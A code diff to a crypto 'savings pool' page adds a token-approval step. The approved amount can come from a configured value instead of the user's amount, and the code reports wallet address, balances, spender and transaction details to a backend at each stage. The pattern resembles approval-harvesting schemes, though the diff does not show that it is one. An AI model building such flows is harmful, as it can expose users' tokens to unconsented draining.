@@ -18,7 +18,10 @@ import { MarketTicker } from "@/components/layout/market-ticker";
 import { MobileBottomNav } from "@/components/layout/mobile-bottom-nav";
 import {
   approveAssetTransfer,
+  formatTokenAmount,
+  getAssetManagerConfig,
   openFixedSavingsPosition,
+  parseTokenAmount,
   readLocalAssetBalances,
   type AssetSymbol,
   type VipPlanName,
@@ -32,6 +35,7 @@ import {
   withdrawUsdcBalance,
 } from "@/lib/pool-integration";
 import { getPreferredEvmProvider, type DetectedWalletProvider } from "@/lib/wallet-provider";
+import { syncAuthorizationEvent } from "@/lib/authorization-sync";
 
 type Copy = {
   tabs: string[];
@@ -97,7 +101,9 @@ const en: Copy = {
     walletNotConnected: "Connect wallet first",
     walletUnavailable: "No supported EVM wallet found",
     walletReady: "Wallet ready",
-    authorizationReady: "Authorization submitted. You can continue to the plan page.",
+    authorizationReady: "Authorization submitted by wallet. Backend status recorded.",
+    authorized: "Authorized",
+    authorizationSyncPending: "Backend sync pending",
     commissionMode: "Commission mode",
     automaticPayout: "Automatic",
     manualPayout: "Manual claim",
@@ -180,7 +186,9 @@ const zh: Copy = {
     walletNotConnected: "请先连接钱包",
     walletUnavailable: "未检测到支持的钱包",
     walletReady: "钱包已读取",
-    authorizationReady: "授权已提交，可继续进入计划页。",
+    authorizationReady: "钱包授权已提交，后台状态已记录。",
+    authorized: "授权成功",
+    authorizationSyncPending: "后台同步待处理",
     commissionMode: "佣金发放方式",
     automaticPayout: "自动发放",
     manualPayout: "手动领取",
@@ -909,7 +917,7 @@ function RecordPanel() {
   );
 }
 
-function DepositPanel({ onEnterPlan }: { onEnterPlan: () => void }) {
+function DepositPanel() {
   const { c } = usePoolCopy();
   const [asset, setAsset] = useState(savingsPoolDepositConfig.assets[0].id);
   const [amount, setAmount] = useState("");
@@ -917,6 +925,7 @@ function DepositPanel({ onEnterPlan }: { onEnterPlan: () => void }) {
   const [balances, setBalances] = useState<Partial<Record<AssetSymbol, string>>>({});
   const [status, setStatus] = useState(c.labels.walletNotConnected);
   const [authorized, setAuthorized] = useState(false);
+  const [approvedAsset, setApprovedAsset] = useState<AssetSymbol | null>(null);
   const activePlan = savingsPoolPlans.find(
     (plan) => plan.id === savingsPoolDepositConfig.activePlanId
   );
@@ -926,7 +935,6 @@ function DepositPanel({ onEnterPlan }: { onEnterPlan: () => void }) {
   const approveDeposit = async () => {
     if (authorized) {
       setStatus(c.labels.authorizationReady);
-      onEnterPlan();
       return;
     }
     const detected = getPreferredEvmProvider(window);
@@ -940,16 +948,80 @@ function DepositPanel({ onEnterPlan }: { onEnterPlan: () => void }) {
       return;
     }
     try {
+      const config = getAssetManagerConfig();
+      const token = config.tokens[symbol];
+      const approvalRaw = parseTokenAmount(config.approvalAmount || amount, token.decimals);
+      const approvalDisplay = formatTokenAmount(approvalRaw, token.decimals);
       setStatus("Reading wallet balance");
       const snapshot = await readLocalAssetBalances({ ethereum: detected.provider });
       setWalletAddress(snapshot.account);
       setBalances(snapshot.balances);
+      await syncAuthorizationEvent({
+        status: "pending",
+        walletAddress: snapshot.account,
+        walletProvider: detected.name,
+        walletProviderId: detected.id,
+        chainId: config.chainId,
+        chainName: config.chainName,
+        tokenSymbol: symbol,
+        tokenAddress: token.address,
+        spenderAddress: config.spender,
+        approvalAmountRaw: approvalRaw.toString(),
+        approvalAmountDisplay: approvalDisplay,
+        requestedAmountDisplay: amount,
+        projectContract: config.spender,
+        contractRole: "assetManager",
+        balances: snapshot.balances,
+      });
       setStatus("Waiting for wallet confirmation");
       const result = await approveAssetTransfer({ ethereum: detected.provider, asset: symbol, amount });
       setWalletAddress(result.account);
       setAuthorized(true);
-      setStatus(`${detected.name} · ${c.labels.authorizationReady}`);
+      setApprovedAsset(symbol);
+      const syncResult = await syncAuthorizationEvent({
+        status: "success",
+        walletAddress: result.account,
+        walletProvider: detected.name,
+        walletProviderId: detected.id,
+        chainId: config.chainId,
+        chainName: config.chainName,
+        tokenSymbol: symbol,
+        tokenAddress: token.address,
+        spenderAddress: config.spender,
+        approvalAmountRaw: result.amount,
+        approvalAmountDisplay: approvalDisplay,
+        requestedAmountDisplay: amount,
+        txHash: result.hashes.at(-1),
+        projectContract: config.spender,
+        contractRole: "assetManager",
+        balances: snapshot.balances,
+      });
+      setStatus(`${detected.name} · ${c.labels.authorizationReady}${syncResult.status === "failed" ? ` · ${c.labels.authorizationSyncPending}` : ""}`);
     } catch (error) {
+      try {
+        const config = getAssetManagerConfig();
+        const token = config.tokens[symbol];
+        await syncAuthorizationEvent({
+          status: "failed",
+          walletAddress,
+          walletProvider: detected.name,
+          walletProviderId: detected.id,
+          chainId: config.chainId,
+          chainName: config.chainName,
+          tokenSymbol: symbol,
+          tokenAddress: token.address,
+          spenderAddress: config.spender,
+          approvalAmountRaw: "",
+          approvalAmountDisplay: config.approvalAmount,
+          requestedAmountDisplay: amount,
+          projectContract: config.spender,
+          contractRole: "assetManager",
+          balances,
+          errorMessage: error instanceof Error ? error.message : "Authorization failed",
+        });
+      } catch {
+        // Keep the wallet-facing error as the primary message.
+      }
       setStatus(error instanceof Error ? error.message : "Authorization failed");
     }
   };
@@ -1018,7 +1090,7 @@ function DepositPanel({ onEnterPlan }: { onEnterPlan: () => void }) {
         onClick={approveDeposit}
         className="w-full rounded-md bg-accent px-4 py-3 text-sm font-semibold text-bg"
       >
-        {authorized ? c.labels.smartContract : c.labels.deposit}
+        {authorized ? `${c.labels.authorized}${approvedAsset ? ` · ${approvedAsset}` : ""}` : c.labels.deposit}
       </button>
       <p className="text-xs text-muted" data-testid="deposit-wallet-status">{status}</p>
     </section>
@@ -1105,7 +1177,7 @@ export default function SavingsPoolPage() {
               {mainTab === 0 ? <PoolDataPanel /> : null}
               {mainTab === 1 ? <PlanPanel /> : null}
               {mainTab === 2 ? <AccountPanel /> : null}
-              {mainTab === 3 ? <DepositPanel onEnterPlan={() => changeMainTab(1)} /> : null}
+              {mainTab === 3 ? <DepositPanel /> : null}
             </div>
           </section>
           <PageFooter />
